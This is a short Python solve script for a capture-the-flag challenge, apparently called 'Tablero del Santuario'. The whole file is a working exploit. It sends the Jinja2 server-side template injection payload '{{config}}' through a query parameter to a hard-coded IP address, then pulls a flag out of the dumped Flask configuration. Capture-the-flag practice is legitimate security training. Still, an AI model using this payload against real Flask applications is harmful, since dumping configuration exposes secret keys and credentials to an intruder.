#!/usr/bin/env python3
"""
Solve script for Challenge #7: Tablero del Santuario
Exploits SSTI in Jinja2 to read FLAG from Flask config.
"""

import sys
import requests
import re

URL = "http://192.99.247.166:8083/saludo"

def solve():
    # Jinja2 payload to dump Flask config
    params = {"nombre": "{{config}}"}
    
    resp = requests.get(URL, params=params, timeout=10)
    
    # Extract flag from response
    flag_match = re.search(r'EVIL\{[^}]+\}', resp.text)
    if flag_match:
        print(flag_match.group(0))
        return 0
    
    print("Flag not found in response", file=sys.stderr)
    return 1

if __name__ == "__main__":
    sys.exit(solve())